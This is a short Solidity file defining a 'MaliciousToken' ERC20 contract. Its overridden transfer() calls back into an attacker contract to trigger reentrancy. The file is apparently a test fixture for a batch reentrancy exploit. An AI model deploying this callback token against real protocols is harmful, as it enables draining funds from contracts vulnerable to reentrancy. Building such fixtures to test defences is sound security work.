// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../test/BatchReentrancyExploit.t.sol";

contract MaliciousToken is ERC20 {
    Attacker public attacker;

    constructor() ERC20("Malicious Token", "MTK") {}

function setAttacker(address payable _attacker) external {
        attacker = Attacker(_attacker);
    }

    // This is the key to the attack.
    // Standard ERC20 transfer() does NOT call the recipient.
    // This malicious version DOES, allowing the re-entry.
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Standard transfer logic
        _transfer(msg.sender, to, amount);

        // MALICIOUS PART: If the recipient is the attacker contract,
        // call back into it to trigger the re-entrancy.
        if (to == address(attacker)) {
            attacker.attack();
        }
        return true;
    }

    // Helper to mint tokens for testing
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}